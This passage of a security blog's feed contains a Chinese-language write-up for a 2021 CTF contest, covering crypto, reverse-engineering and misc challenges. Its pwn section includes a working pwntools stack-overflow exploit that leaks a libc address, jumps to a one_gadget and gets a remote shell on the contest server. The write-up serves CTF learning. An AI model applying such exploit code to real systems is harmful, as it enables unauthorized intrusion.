a995593f808062b2dc1e4f5e1bdd3b0e8d7d7d72a3309588d8d2aa93387b08df4da9a5b32bc7256f8727c974b22827a9e51003236523e962f60eb6679db5fa12f22ce826d868a9a8ea414c6560863c0226931adbc8a724bb3b3a035e9183103af913f4bd097246f6c2b35d9ebf8b4edbdd69e1ba616626bb94cdde57fc3834dd8ddc910b836686c2015414af3f3054a047f510cc73f7f56f684751dbac0ce558c4690ce2abcba23d5190fc4d34e20a04fbd87508fa9f03bdb02dd9dd7817ee452cf54679c47ccc1c8b6f47ac0d558f8c7a2ac636da126a46437e4d682ab7cfce99f383da658f1c77845df79b6c296ea8aef2c30ca69bfe06f7d111474ff0d8624dfaddfc43304fd404bf0489d782b459a8694a036b0ea83505ab70a6e899f96772421a93dd1cba63b4f7d2fc185d2a35236f393da4336eccb6d542277c9b96b6d02bcce6a421c7aa4c0c90b69164cbb2a91e8720d201dd7202b76e8516d434026b46ee5461154c662ed572453209a0b8866a286a72db15db7da692ce43734616e6bc852668d7ed1e3a72166bae9e09f4649c3a54c45d057eac040b2758d2a6390ec8e74ffc6c95408620ea88314042d957f7157513783f2d4376081f715b10467bce52d87863fde7b57b037cff2fdb03c875929379aedb3f5627203dca64238ceaa64eed58ec0b3e387a7cfd08adb3e0e143567a9c9a08957b2ec35e4142f8d10bd617d9d55afaf517c7e908e3a3a67fa4eba8f9fb665b88f38194fc642f2d103957fcc4367dd04cdd535532d3eeb2577039b772512e26460d4f4603fef1cd3ff8b7a8a645164cbb88152740557967eeaa43f01e1311e6c643bcbcb3a741e7d2a5983cdd27fd44ff5ecc605ab7c5f47c43819eaf164522ab3d65aad3499565116bd85463a29a7925b26a7df570569d68b651624fa99aa0b02b46e2da26e88f9d41480c0281c1814416731433784f3dfe977f7c0192a7c7b895203350c43595cd3b7ad735af1acef457f1ac3b004de7f37ffdbd85688f43d404daf2a36d479c2cb1e1dca1a9feadd96dad21b3010fa75fcee831812ad6840a236354f331636dadbf221fd96da7e96fa5ae5c235e76ee6eb189943d568add8cb86c7d19de49812e2dcb8b0d9ad55c343a5c60ed4b070d57596ddb20c325bb9a346e897614de0d6887179bb6c641e6e9bfa18ac896b15cbcd4b937be286fd3c1b050a698b279e78997755f0e25f5b134ec1e3fa10d0db1db49ec0cfb1b1f466cb9dc815c35f7cc28676d28bf2518ec09022b94cdb2ad34b42f82d9ce975f844e5368408f4ec5bfe80785b2840535ad58866a86d91d494577c0b9b6c3fc5a66c30bcd4032bcb5239bf3566a8d0ebfe207dae469e62508fc1db21a57bd6ec78002faa055027b286cdb6253dd4642203309d0ede626f203058f456cfe7f5b69103ef0cee75ef78a2707ff1cec7822547a4c8d299a229c7111700fe317fc6cea4549a34283c4eeffa0cd960576997a48f1b1216af349123f2c25f2074b87fad81a538daa2315a4c025f66e48fbf0ea871cea9622b6f6c5c6e1106a126e92aa44311991e91d1b5f7069c30fa19aff5a5df58f340dd1024780a030d22fb6534d3f4c457457eab6a332638352a6d39575216f49b5b6f3aa828af0884e31a49581bc4296007589b08a17c155a54b939ae89e993653798460b79f4a9d79ee771532d1f2edf9244e2bb168e3394d7de2237c5ae1645c7cee2e6a0084b1c04401c983d5bfa949804b647aeb9cf293941e3e235bff09d75991b1da14ff8f2e66fe78580f8c392aa187af4ace1a1685da272957c26bb0d3d46d6b2b24b0be0329e36fcde38681ac26819f4edd9624a9b7f0b8a04ec0fb5a7fa1d122282d33f50bb54e3f8d7fa7996e56f2d20f6a331c0d799ff48127e380eb835503822fed87f4ff2e260cfc270338d2f6b28f507a6db82070c9634c728a17af252c96f80d05cadfcf2a9119f5c6e188f287ac989eae36f9f7bda31adf73ef79e10e536406e74043ad89ee09f385ae9d2dfa2ad84937fd169472f7aa2744541380f9b041f9240dc161ccf01794ec8055798db3ca3015d0b4e0889655d3564513432976f59a9b4d88971e45ae3199e60f516037fd3ef77c707921602c665050473700d664656ac86e0999aa932b9e76999793fa65d2b3cd86fa1929a0b8984adf55bcb825f94b9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</title>
    <link href="lexsd6.github.io/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/"/>
    <id>lexsd6.github.io/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/</id>
    <published>2021-11-27T02:08:01.695Z</published>
    <updated>2021-12-01T09:10:35.889Z</updated>
    
    <content type="html"><![CDATA[<p>周末抽空看下了，感觉难度差异太大，涝的涝死旱的旱死，太菜了.( ┬o┬)…<a id="more"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h3><p>在<a href="https://www.boxentriq.com/code-breaking/vigenere-cipher" target="_blank" rel="noopener">https://www.boxentriq.com/code-breaking/vigenere-cipher</a> 网站爆破得到为key:asterism</p><p><img src="image-20211127100844149.png" alt="image-20211127100844149"></p><p>解密得到falg。</p><p><img src="image-20211127162758654.png" alt="image-20211127162758654"></p><p>flag为：<code>flag{53d613fc-6c5c-4dd6-b3ce-8bc867c6f648}</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="supercall"><a href="#supercall" class="headerlink" title="supercall"></a>supercall</h3><p>简单栈溢出，利用<a href="https://github.com/lexsd6/LibcSearcher_plus" target="_blank" rel="noopener">LibcSearcher</a>通过题目泄露出的<code>_IO_2_1_stdin_</code>的真实地址找到 libc 基地址，用one_gatget  来get shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/27 13:39:07</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./supercall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'123.57.207.81'</span>,<span class="number">16985</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000026796 : pop rdi ; ret</span></span><br><span class="line">stack_addr=int(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">stdin_addr=int(p.recv(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(stack_addr))</span><br><span class="line">log.info(hex(stdin_addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'_IO_2_1_stdin_'</span>,stdin_addr,num=<span class="number">9</span>)</span><br><span class="line"><span class="comment">#[-] 9: local-46e93283ff53133360e02a73ae5b5ba375410855 (source from:/mnt/d/filewsl/supercall/libc-2.27.so)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'2'</span>*<span class="number">8</span>+<span class="string">'3'</span>*<span class="number">7</span>)</span><br><span class="line">p.sendline(<span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'x'</span>*<span class="number">8</span>+p64(x.ogg(num=<span class="number">0</span>)))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[-] 0: 0x4f3d5  execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>再在远程<code>cat flag</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[+] you choose gadget: 0x4f3d5</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">supercall</span><br><span class="line">$ cat f*</span><br><span class="line">flag&#123;2f3f3632-6484-4c00-82f3-a63e0d4340d9&#125;$</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>发现题目有UPX壳，脱壳后，用ida打开审阅发现一疑似加密flag函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40186F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">256</span>]; <span class="comment">// [esp+18h] [ebp-910h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst[<span class="number">2048</span>]; <span class="comment">// [esp+118h] [ebp-810h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+918h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+91Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">18</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v1[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  sub_4017D2(v1, i);#fun2</span><br><span class="line">  <span class="built_in">memset</span>(Dst, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  sub_4015F7(v1, Dst, i); #fun1</span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; Dst[j]; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Dst[j] != a7g5d5bayTmdlwl[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"不对哦~下次再来吧~"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(asc_405016);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进fun2发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4017D2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = *(<span class="keyword">unsigned</span> __int8 *)(j + a1);</span><br><span class="line">      <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a2 % i )</span><br><span class="line">        *(_BYTE *)(j + a1) ^= (_BYTE)i + (_BYTE)j;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(j + a1) ^= (<span class="keyword">unsigned</span> __int8)(j % i) + (_BYTE)j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是对我们的输入字符串，每一个字符按位置进行与操作。</p><p>fun1是字符串的base64加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v16 &lt; a3 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = v13;</span><br><span class="line">  v14 = v13 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v3) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + a1) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v11 = <span class="number">16</span> * *(_BYTE *)(v16 + a1) &amp; <span class="number">0x30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">1</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v14;</span><br><span class="line">    v5 = v14 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v4) = Str[v11];</span><br><span class="line">    *(_BYTE *)(v5 + a2) = <span class="string">'='</span>;</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    v13 = v5 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v6 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v14;</span><br><span class="line">  v15 = v14 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v7) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">1</span> + a1) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span> | v11];</span><br><span class="line">  v12 = <span class="number">4</span> * *(_BYTE *)(v16 + <span class="number">1</span> + a1) &amp; <span class="number">0x3C</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">2</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v15) = Str[v12];</span><br><span class="line">    v8 = v15 + <span class="number">1</span>;</span><br><span class="line">    v13 = v15 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v8 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a2 + v15) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">2</span> + a1) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span> | v12];</span><br><span class="line">  v9 = v15 + <span class="number">1</span>;</span><br><span class="line">  v13 = v15 + <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v9) = Str[*(_BYTE *)(v16 + <span class="number">2</span> + a1) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v16 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但在调试时，发现在fun1之前，有个函数将全局变量str值改动了</p><p>这个函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_401536</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// ST13_1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strlen</span>(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v2 / <span class="number">2</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; v2 - i - <span class="number">1</span> &gt; j; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] &gt; Str[j + <span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = Str[j];</span><br><span class="line">        Str[j] = Str[j + <span class="number">1</span>];</span><br><span class="line">        Str[j + <span class="number">1</span>] = v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  dword_406060 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是写脚本还愿str：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">base_flag=[]</span><br><span class="line"><span class="comment">#x='7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">x=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">v2 = len(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">for ( i = 0; v2 / 2 &gt; i; ++i )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    for ( j = 0; v2 - i - 1 &gt; j; ++j )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( Str[j] &gt; Str[j + 1] )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v0 = Str[j];</span></span><br><span class="line"><span class="string">        Str[j] = Str[j + 1];</span></span><br><span class="line"><span class="string">        Str[j + 1] = v0;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    base_flag.append(ord(i))</span><br><span class="line">print(base_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(v2//<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(v2-i<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> base_flag[j]&gt;base_flag[j+<span class="number">1</span>]:</span><br><span class="line">            v0=base_flag[j]</span><br><span class="line">            base_flag[j]=base_flag[j+<span class="number">1</span>]</span><br><span class="line">            base_flag[j+<span class="number">1</span>]=v0</span><br></pre></td></tr></table></figure><p>得到真正的str：<code>ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz</code></p><p>在对fun1函数和fun2函数逆向换源，得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">table = <span class="string">'ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">table2 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">'7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">tmp2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">index = table.index(i)</span><br><span class="line">tmp2 += table2[index]</span><br><span class="line"></span><br><span class="line">k=base64.b64decode(tmp2+<span class="string">'=='</span>)</span><br><span class="line">nre=<span class="string">''</span></span><br><span class="line">kk=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)):</span><br><span class="line">    kk.append(ord(k[i]))</span><br><span class="line"></span><br><span class="line">print(kk)</span><br><span class="line">a2=len(kk)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range((<span class="number">10</span>)):</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(kk)):</span><br><span class="line"></span><br><span class="line">        print(str(a2%i)+<span class="string">''</span>+str(i))</span><br><span class="line">        <span class="keyword">if</span> a2%i!=<span class="number">0</span>:</span><br><span class="line">            kk[j]^=(i+j)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            kk[j]^=((j%i)+j)</span><br><span class="line">    print(kk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(k)</span></span><br><span class="line">print(kk)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (kk):</span><br><span class="line">    flag+=chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填完表就有flag</p><p><img src="image-20211127162357150.png" alt="image-20211127162357150"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末抽空看下了，感觉难度差异太大，涝的涝死旱的旱死，太菜了.( ┬o┬)…</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Large bin Attack for Glibc 2.31 学习</title>
    <link href="lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/"/>
    <id>lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-07T15:06:30.390Z</published>
    <updated>2021-11-08T13:30:17.619Z</updated>
    
